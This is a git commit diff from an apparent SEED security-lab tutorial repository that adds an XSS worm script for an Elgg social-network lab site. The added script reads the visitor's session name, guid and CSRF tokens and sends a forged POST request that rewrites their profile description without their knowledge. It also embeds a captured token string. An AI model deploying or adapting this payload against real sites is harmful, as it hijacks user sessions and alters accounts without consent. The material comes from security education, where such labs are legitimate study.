15a8203a3ccb5b3bf581d9c848006f9b7cdf885d
cappetta <thomas.cappetta@gmail.com>
2019-11-16 19:15:51 -0500

    updating the lab code

--- tutorials/seed/lab6-xss/xss-worm-non-properagating.js
+++ tutorials/seed/lab6-xss/xss-worm-non-properagating.js
@@ -84,3 +84,45 @@ Ajax.send(content);
 }
 }
 </script>
+
+
+
+
+
+<script id="worm" type="text/javascript">
+window.onload = function(){
+//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+//and Security Token __elgg_token
+
+// lets get some session data and store it into variables
+var userName="&name="+elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+// the url of the target to post the payload to
+var sendurl="http://www.xsslabelgg.com/action/profile/edit"
+
+
+var content="&__elgg_token=z9_XRGylu6quwa23dH0djw&__elgg_ts=1573935296&description=%3Cp%3EJSSamiWormWorks%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=44";
+
+var samyGuid="47";
+if(elgg.session.user.guid!=samyGuid)
+{
+//Create and send Ajax request to modify profile
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST",sendurl,true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Keep-Alive","300");
+Ajax.setRequestHeader("Connection","keep-alive");
+Ajax.setRequestHeader("Cookie",document.cookie);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
+content ="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];
+Ajax.send(content);
+}
+}
+</script>
